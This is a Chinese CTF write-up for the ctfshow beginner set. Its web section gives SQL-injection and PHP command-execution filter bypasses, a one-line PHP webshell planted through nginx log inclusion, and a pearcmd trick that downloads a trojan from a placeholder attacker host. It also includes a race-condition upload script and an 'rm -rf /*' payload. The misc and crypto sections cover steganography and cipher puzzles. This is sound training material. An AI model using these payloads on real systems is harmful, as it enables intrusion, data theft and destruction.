---
title: ctfshow_萌新
author: Creexile
date: 2024-06-22
lastMod: 2025-04-10
summary: '除了部分Web都挺萌新的'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, PHP, 隐写, CTF]
---

# Web

---

## Web1

核心代码如下, 绕过正则即可, 或者sql注入

```php
$id = $_GET['id'];
 # 判断id的值是否大于999
if(intval($id) > 999){
    die("id error");
}else{
    $sql = "select * from article where id = $id order by id limit 1 ";
    echo "执行的sql为：$sql<br>";
    $result = $conn->query($sql);	# 执行sql 语句
}
```

能绕过的手段包括:

```
?id=~~1000		# 逻辑非
?id=0000|1000	# 逻辑或
?id='1000'		# 字符串
?id=2 or id=1000	# 拼接语句(管道符)
?id=!!1000		# 感叹号
?id=0b001111101000	# 二进制转换
?id=round(999.9)	# PHP四舍五入
?id=8*125		# 数学运算
?id=power(10,3)	# power函数
?id=500 div 0.5	# sql的除号
?id='1e3'		# 科学记数法
?id=/**/1000	# 注释
?id=/*!1000*/	# 内联注释
?id=125<<3		# 左右移
?id=0x3E8		# intval()函数利用
?id=2 union select * from article where id=1000	# 直接sql注入
?id=CAST(0x339 AS INT)	# sql认为的1000, PHP不一定认.可以使用sql的十六进制的1000
```

> intval()函数的第二个参数默认为10, 即只要遇到非数字转换就会暂停

## web10

核心代码如下, 是eval类型的命令执行

```php
$c = $_GET['c'];
if(!preg_match("/system|exec|highlight/i",$c)){
	eval($c);
}else{
	die("cmd error");
}
```

本题eval命令执行, 绕过方式:

```
?c=passthru('cat config.php');	# 替换命令
?c=echo `tac config.php`;		# 反引号命令执行
?c=show_source('config.php');	# php函数命令执行
?c=echo file_get_contents('config.php');	# 同上
?c=readfile("config.php");		# 同上
?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');	# 拼接
?c=echo `$_GET[1]`;&1=tac config.php	# GET方法
?c=echo `$_POST[1]`;然后在post data中写入1=tac config.php	# POST方法
?c=print_r(get_defined_vars()); # 在数组中取出当前已定义的变量
?c=include('php://filter/read=convert.base64-encode/resource=config.php');
# 变成命令执行再利用伪协议
?c=$a=base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);	# 编码绕过
?c=echo `tac conf*`;	# 通配符
?c=passthru('tac conf?g?p?p');	# 同上
?c=echo tac confi[g][!0-9]ph[p];	# 同上
?c=echo `tac conf\ig*`;	# 利用\隔开
?c=echo $flag?>		# 解了那么多次发现输出是$flag,那就试试直接输出它
```

`print_r(getenv());`可以输出当前的环境变量, 可能会有用, 反正这题没用

再给出一些可供替换的函数/命令/符号:

```
命令执行: system(),exec(),passthru(),shell_exec(),proc_open()和popen()
查看文件: cat,tac,more,head,tail,
分号过滤: ?>闭合开头后,最后一行可以不用分号

# 对于popen()
<?php
$handle = popen('/bin/ls', 'r');
echo "'$handle'; " . gettype($handle) . "\n";
pclose($handle);
?>
```

## Web17

核心代码如下, 是文件包含

```php
$c=$_GET['c'];
if(!preg_match("/php/i",$c)){
	include($c);
}
```

可以nginx日志包含:

1. 访问/var/log/nginx/access.log
2. 在user-agent写入一句话木马`<?php @eval($_POST['2333']); ?>`
3. 蚁剑连接即可

## Web22

```php
$c=$_GET['c'];
if(!preg_match("/\:|\/|\\\/i",$c)){
	include($c.".php");
}
```

先介绍pear
pear是一个是可重用的PHP组件框架和系统分发
在pear中有一个pearcmd.php的类, 可以用+拼接命令, 例如从攻击机下载木马
`pearcmd&+download+http://xxxxx/index.php`

还有直接写shell:

```
/index.php?+config-create+/&c=pearcmd&/<?=@eval($_POST['cmd']);?>+/var/www/html/test.php
# 在/var/www/html下写入webshell
```

然后可以POST `cmd=system("tac 36d.php");`

## 获得百分百的快乐

```php
if(strlen($_GET[1])<4){
	echo shell_exec($_GET[1]);
}
else{
	echo "hack!!!";
}
```

完全是通配符的利用,毕竟传入要求小于4, 完整使用方法可以看[博客](https://www.anquanke.com/post/id/87203)

根据这个文章,我们只需要执行下面两个命令就能解决这个题目, 在F12就能拿到结果

```
>nl		# 创建叫做nl的文件
>*		# 以第一个文件名为命令去执行
```

## Web23

乍看是文件上传,但是上传后却访问不到任何东西, 非常的神奇
然后发现上传得到的文件是按照当前时间重新命名的,这可不行
既然是重命名,那么就可以使用条件竞争策略进行爆破

```python
# coding: utf-8
# Auth: y2hlbmc
import requests
import time
import threading

url = "http://7dbded2a-12d4-4d3a-a8c5-ddc6d8e78d74.challenge.ctf.show/"

def Thread(fun,*args):
    return threading.Thread(target=fun, args=args)

def req(fname):
    r = requests.get(url + "uploads/" + fname + ".php")
    x = r.text
    if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
        print(x)

def Thread_start(fname):
    for i in range(100,400):
        # 每个文件名单起一个线程
        Thread(req, fname + str(i)).start()

def upload():
    while True:
        file_data = {'file':('shell.php',"<?php system(\"tac ../flaghere0.txt\");?>".encode())}
        r = requests.post(url + "upload.php",files=file_data)
        txt = r.text
        print("uploaded:",txt)
        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔
        ts = int(time.mktime(time.strptime(txt[8:22], "%Y%m%d%H%M%S")))
        fname = time.strftime("%Y%m%d%H%M%S", time.localtime(ts + 1))
        # 单起一个线程，爆破下一次upload的文件名
        Thread(Thread_start, fname).start()


if __name__ == '__main__':
    upload()
```

嫖来的源码:

```php
$new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix;
if (move_uploaded_file($temp_name, 'uploads/'.$new_filename)){
	echo "uploads/$new_filename";
	sleep(1);
	system("rm -rf ./uploads/*.php");
}
```

嫖来的[出处](https://wp.ctf.show/d/131-23-24)

# MISC

---

## 杂项6

是伪加密, 没有密码

**原理:** 压缩包开头有一些固定的格式:

1. 压缩源文件数据区：

```
50 4B 03 04		# 这是头文件标记  （0x04034b50）
14 00		# 解压文件所需 pkware 版本
00 00		# 全局方式位标记（判断有无加密）
08 00		# 压缩方式
DC 01		# 最后修改文件时间
53 50		# 最后修改文件日期
```

2. 压缩源文件目录区：

```
50 4B 01 02		# 目录中文件文件头标记  （0x02014b50）
1F 00		# 压缩使用的 pkware 版本
14 00		# 解压文件所需 pkware 版本
00 00		# 全局方式位标记（判断是否为伪加密）
08 00		# 压缩方式
DC 01		# 最后修改文件时间
53 50		# 最后修改文件日期
```

3. 压缩源文件目录结束标志：

```
50 4B 05 06		# 目录结束标记
00 00		# 当前磁盘编号
00 00		# 目录区开始磁盘编号
01 00		# 本磁盘上纪录总数
01 00		# 目录区中纪录总数
5A 00 00 00		# 目录区尺寸大小
3B 00 00 00		# 目录区对第一张磁盘的偏移量
00 00		# ZIP 文件注释长度
```

全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性
第二个数字为奇数时 –> 加密
第二个数字为偶数时 –> 未加密
一般无加密的时候数字应该都是`00 00`, 而有加密的应该都是`09 00`, 伪加密则是只有第二个是`09 00`

本题文件16进制如下, 已经划分好标志了, 可以看出是伪加密, 将其修改为`00 00`即可

![image-20240622104904527](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622104904527.png)

## 杂项7,8

类似, 就放在一起了

根据题目的提示, 是修改宽和高, 十六进制中宽高位置如下:
修改的时候我们一般是最高位加一或者减一, 可以直接拿到答案

![image-20240622110948116](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622110948116.png)

对于一些工具, 通用方法是CRC校验和来爆破宽和高

## 杂项11

jpeg图片信息隐藏:
利用jphs提取(seek)出txt文件, winhex发现似乎是png文件头, 修改后得到二维码
扫码得到url, url后面是一串base64编码,解码得到flag
`flag{战神归来发现自己儿子在刷题，一怒之下召唤10万将士来报仇}`

## 萌新 隐写6

audacity打开文件后在音轨上找到类似摩斯电码的音频
长的为`-`, 比较短的为`.`, 间隔比较长的是分隔符`/`,然后解码即可
--/..-/--../../-.-/../.../--./-----/-----/-..
得到: MUZIKISG00D

# Crypto

## 萌新\_密码1

web偶尔用一下, 浅学一点

看到存在6C、6B、而且由予没有出现G及其以后的推测为16进制加密，尝试使用HEX16解密，得到
S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=
看到了文末的=下意识认为是base64加密，尝试使用base64进行解密，得到结果为：
KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}
存在KEY{} 字符, 符合栅栏加密的方式, 于是尝试解密, 得到结果为： KEY{dffb06a33eeeb0d259c84bd8cf146d08-}

# 价值不多

## Web

---

### Web2-7

都是和Web1一样的过滤:
Web2新增`or`
Web3新增`- \\ * < > ! x hex +`
Web4新增`\ / < > ! ( ) select`
Web5新增`' " |`
Web6新增`^`
Web7新增`~`

### Web8

告诉你了是程序猿跑了, 那就是删库跑路
`?flag=rm -rf /*`

### Web9

压根没过滤, 甚至是指定命令执行,原因是正则表达式前面忘记加上`!`
`?c=system('cat config.php');`

### Web11-15

过滤新增:
Web11新增 `cat`
Web12新增 `config . php config`
Web13新增 `; file`
Web14新增 `(`
Web15新增 `* ? < > = `, 去除`;`

### Web16

爆破或者使用md5在线解密即可得到

```
import hashlib
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
payload=''
for i in str1:
    for j in str1:
        for k in str1:
            s = hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest()
            #print(type(s))
            if s=='a6f57ae38a22448c2f07f3f95f49c84e':
                print(i+j+k)
```

### Web18

过滤新增:
Web18新增 `file`
Web19新增 `base`
Web20新增 `rot`
Web21新增 `:`

### Web24

因为只需要把23的拿过来改成rand(0,300)和sleep(3)就可以了,就是那个(ts + 1)变成(ts + 3)

## Misc

---

### 杂项

杂项1: md5在线解码
杂项2: winhex拉到底或者在stegsolve中analyse->file format
杂项3: 看图写话971015
杂项4: archpr爆破压缩包密码:372619038
杂项5: 所有大写字母拿出来就是flag, FLAG{CTFSHOWNB}
杂项10: 离远点眯眼, 能看出 我好喜欢你 (所以为什么没有9)

### 隐写1

隐写1: 打不开的png文件, winhex打开发现是文件头错了, 修改即可
隐写2: jpeg隐写, 同杂项11
萌新隐写5: 用winhex打开后提取有用字符然后base32解码(其实我用的cyberchef自动解码):
MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======

> 特征似乎是字符全大写, 后5位=补齐

### 萌新 隐写2

直接拿去爆破压缩包密码, 得到`19981000`

### 萌新 隐写4

word选项->显示->隐藏文字

### 萌新 隐写3

就写在图片上

## Crypto

---

### 萌新\_密码2

就是这几个字符在键盘上分别把`fwy`三个字母围了起来,加上KEY{}提交即可

### 萌新 密码3

首先是莫斯电码解码,这些斜杠解码后只是空格, 我直接去掉了, 得到如下字符串
`MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM`
后面这里是bacon密码, 因为只识别AB,所以换成AB
两个都试过了, `AABBABABAAABBBABABBAAAAAAABBABAABBA`靠谱, 解出来`guowang`
要大写提交, 我不到啊

### 萌新 密码#4

`QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==`
CyberChef一把梭: base64+HTML Entity+base85
